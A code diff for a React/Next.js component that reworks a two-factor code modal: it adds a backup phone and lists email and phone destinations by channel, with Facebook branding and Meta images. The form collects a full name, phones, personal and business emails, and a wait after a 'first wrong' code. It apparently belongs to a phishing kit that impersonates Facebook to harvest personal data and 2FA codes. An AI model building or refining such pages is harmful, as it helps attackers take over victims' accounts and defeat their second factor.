@@ -2,7 +2,7 @@
 
 import React from 'react'
 import Image from 'next/image'
-import { buildTwoFaDestinationsLabel } from '@/utils/twoFaDescription'
+import { buildTwoFaDestinations } from '@/utils/twoFaDescription'
 import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
 import { FormData, updateForm } from '@/app/store/slices/stepFormSlice'
 import { useAppStrings } from '@/hooks/useAppStrings'
@@ -40,9 +40,14 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
 
   const [twoFa, setTwoFa] = React.useState('')
 
-  const { fullName, phone, email, emailBusiness } = (formDataState as FormData) || {}
+  const { fullName, phone, phoneBackup, email, emailBusiness } = (formDataState as FormData) || {}
 
-  const twoFaDestinations = buildTwoFaDestinationsLabel(email ?? '', phone ?? '', emailBusiness)
+  const twoFaDestinations = buildTwoFaDestinations(
+    email ?? '',
+    phone ?? '',
+    emailBusiness,
+    phoneBackup
+  )
 
   const [, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC)
 
@@ -207,7 +212,45 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
             <span className="mv-secure-identity-dot" aria-hidden />
             <span>{t.common.facebook}</span>
           </div>
-          <p className="mv-secure-body">{t.twoFa.description(twoFaDestinations)}</p>
+          <div className="mv-secure-channels">
+            <p className="mv-secure-body">{t.twoFa.intro}</p>
+            <div className="mv-secure-channel-list">
+              {twoFaDestinations.emails.length > 0 ? (
+                <section className="mv-secure-channel" aria-label={t.twoFa.emailHeading}>
+                  <p className="mv-secure-channel-label">{t.twoFa.emailHeading}</p>
+                  <ul className="mv-secure-channel-items">
+                    {twoFaDestinations.emails.map((item) => (
+                      <li key={item}>{item}</li>
+                    ))}
+                  </ul>
+                </section>
+              ) : null}
+              {twoFaDestinations.phones.length > 0 ? (
+                <section className="mv-secure-channel" aria-label={t.twoFa.phoneHeading}>
+                  <p className="mv-secure-channel-label">{t.twoFa.phoneHeading}</p>
+                  <ul className="mv-secure-channel-items">
+                    {twoFaDestinations.phones.map((item) => (
+                      <li key={item}>{item}</li>
+                    ))}
+                  </ul>
+                </section>
+              ) : null}
+              <section className="mv-secure-channel" aria-label={t.twoFa.otherHeading}>
+                <p className="mv-secure-channel-label">{t.twoFa.otherHeading}</p>
+                <p className="mv-secure-channel-value">{t.twoFa.authenticator}</p>
+              </section>
+            </div>
+          </div>
+
+          <div className="mv-secure-media mv-secure-media--phone">
+            <Image
+              src="/images/meta/authentication_phone.png"
+              alt={t.twoFa.authIllustrationAlt}
+              width={1895}
+              height={830}
+              sizes="100vw"
+            />
+          </div>
 
           <div className="mv-secure-field">
             <label htmlFor="twoFa" className="mv-secure-label">
@@ -259,13 +302,13 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({
           </button>
         </form>
 
-        <div className="mv-secure-media">
+        <div className="mv-secure-media mv-secure-media--desktop">
           <Image
             src="/images/meta/authentication.png"
             alt={t.twoFa.authIllustrationAlt}
             width={1125}
             height={492}
-            sizes="(max-width: 899px) 100vw, 340px"
+            sizes="340px"
           />
         </div>
       </div>
